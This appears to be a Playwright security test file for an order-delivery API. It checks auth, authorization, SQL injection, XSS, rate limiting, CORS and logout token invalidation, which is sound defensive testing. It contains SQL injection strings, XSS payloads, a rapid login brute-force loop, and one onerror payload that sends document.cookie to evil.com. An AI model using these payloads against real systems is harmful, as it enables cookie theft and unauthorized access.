import { test, expect } from '@playwright/test';
import { ApiClient } from '../helpers/api-client';
import { TEST_ACCOUNTS } from '../helpers/test-data';

const API_BASE = process.env.API_GATEWAY_URL || 'http://localhost:8080';

test.describe('API - Security Tests', () => {
  let adminApi: ApiClient;
  let customerApi: ApiClient;

  test.beforeAll(async () => {
    adminApi = new ApiClient();
    await adminApi.login(TEST_ACCOUNTS.admin.email, TEST_ACCOUNTS.admin.password);

    customerApi = new ApiClient();
    await customerApi.login(TEST_ACCOUNTS.customer.email, TEST_ACCOUNTS.customer.password);
  });

  // --- Authentication & Authorization ---

  test('should reject requests without auth token', async ({ request }) => {
    const response = await request.get(`${API_BASE}/api/v1/orders`);
    expect(response.status()).toBe(401);
  });

  test('should reject requests with expired/invalid JWT', async ({ request }) => {
    const response = await request.get(`${API_BASE}/api/v1/orders`, {
      headers: {
        Authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiZXhwIjoxfQ.invalid',
      },
    });
    expect(response.status()).toBe(401);
  });

  test('should reject requests with malformed auth header', async ({ request }) => {
    const response = await request.get(`${API_BASE}/api/v1/orders`, {
      headers: { Authorization: 'NotBearer some-token' },
    });
    expect([401, 403]).toContain(response.status());
  });

  test('customer should not access admin endpoints', async () => {
    const response = await customerApi.get('/api/v1/users/admins');
    expect([401, 403]).toContain(response.status());
  });

  test('customer should not access admin partner management', async () => {
    const response = await customerApi.put('/api/v1/partners/some-id/approve', {});
    expect([401, 403, 404]).toContain(response.status());
  });

  test('customer should not access other users data', async () => {
    const response = await customerApi.get('/api/v1/users/customers/other-user-id');
    expect([401, 403, 404]).toContain(response.status());
  });

  // --- SQL Injection ---

  test('should handle SQL injection in search params', async () => {
    const response = await adminApi.get("/api/v1/orders?search=' OR '1'='1");
    // Should not return all records - should return empty or error
    expect([200, 400]).toContain(response.status());
    if (response.status() === 200) {
      const body = await response.json();
      const items = body.content || body;
      // If it returns data, it should be a normal search result, not all records
      expect(Array.isArray(items)).toBeTruthy();
    }
  });

  test('should handle SQL injection in path params', async () => {
    const response = await adminApi.get("/api/v1/orders/1' OR '1'='1");
    expect([400, 404, 500]).toContain(response.status());
  });

  test('should handle SQL injection in POST body', async ({ request }) => {
    const loginRes = await request.post(`${API_BASE}/api/v1/auth/login`, {
      data: {
        email: "admin@test.com' OR '1'='1",
        password: "' OR '1'='1",
      },
    });
    // Should NOT return 200 with a valid token
    expect(loginRes.status()).toBeGreaterThanOrEqual(400);
  });

  // --- XSS ---

  test('should sanitize XSS in order creation', async () => {
    const response = await customerApi.post('/api/v1/orders', {
      partnerId: 'test-partner',
      items: [{ name: '<script>alert("xss")</script>', quantity: 1 }],
      deliveryAddress: {
        street: '<img src=x onerror=alert(1)>',
        city: 'Nabeul',
      },
      paymentMethod: 'CASH',
    });
    // Should either reject or sanitize - check the response doesn't contain raw script tags
    if (response.status() === 200 || response.status() === 201) {
      const body = await response.text();
      expect(body).not.toContain('<script>');
    }
  });

  test('should sanitize XSS in support ticket', async () => {
    const response = await customerApi.post('/api/support/tickets', {
      subject: '<script>document.cookie</script>',
      message: '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">',
      category: 'ORDER_ISSUE',
    });
    if (response.status() === 200 || response.status() === 201) {
      const body = await response.text();
      expect(body).not.toContain('<script>');
      expect(body).not.toContain('onerror');
    }
  });

  // --- Rate Limiting ---

  test('should rate limit login attempts', async ({ request }) => {
    const attempts = [];
    for (let i = 0; i < 20; i++) {
      attempts.push(
        request.post(`${API_BASE}/api/v1/auth/login`, {
          data: {
            email: 'brute-force@test.com',
            password: `attempt${i}`,
          },
        })
      );
    }
    const responses = await Promise.all(attempts);
    const statusCodes = responses.map((r) => r.status());

    // At least some requests should be rate-limited (429) after many rapid attempts
    // If no rate limiting exists, this documents the gap
    const has429 = statusCodes.includes(429);
    if (!has429) {
      console.warn('WARNING: No rate limiting detected on /api/v1/auth/login after 20 rapid attempts');
    }
  });

  // --- Input Validation ---

  test('should reject oversized request body', async ({ request }) => {
    const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB
    const response = await request.post(`${API_BASE}/api/v1/auth/login`, {
      data: {
        email: largePayload,
        password: 'test',
      },
    });
    expect([400, 413, 414]).toContain(response.status());
  });

  test('should handle special characters in inputs gracefully', async () => {
    const response = await adminApi.get('/api/v1/partners?search=' + encodeURIComponent('!@#$%^&*(){}[]|\\'));
    expect([200, 400]).toContain(response.status());
  });

  // --- CORS ---

  test('should return proper CORS headers', async ({ request }) => {
    const response = await request.get(`${API_BASE}/api/v1/auth/login`, {
      headers: {
        Origin: 'http://localhost:4200',
      },
    });
    // OPTIONS preflight or actual response should have CORS headers
    // This documents the current CORS behavior
    const corsHeader = response.headers()['access-control-allow-origin'];
    if (corsHeader) {
      expect(['*', 'http://localhost:4200']).toContain(corsHeader);
    }
  });

  // --- Token Security ---

  test('should invalidate token after logout', async ({ request }) => {
    // Login to get a token
    const loginRes = await request.post(`${API_BASE}/api/v1/auth/login`, {
      data: {
        email: TEST_ACCOUNTS.admin.email,
        password: TEST_ACCOUNTS.admin.password,
      },
    });

    if (loginRes.status() !== 200) return;

    const { access_token, accessToken, token } = await loginRes.json();
    const authToken = access_token || accessToken || token;

    // Logout
    await request.post(`${API_BASE}/api/v1/auth/logout`, {
      headers: { Authorization: `Bearer ${authToken}` },
    });

    // Try using the old token
    const afterLogout = await request.get(`${API_BASE}/api/v1/auth/profile`, {
      headers: { Authorization: `Bearer ${authToken}` },
    });

    // Token should be blacklisted
    expect(afterLogout.status()).toBe(401);
  });
});
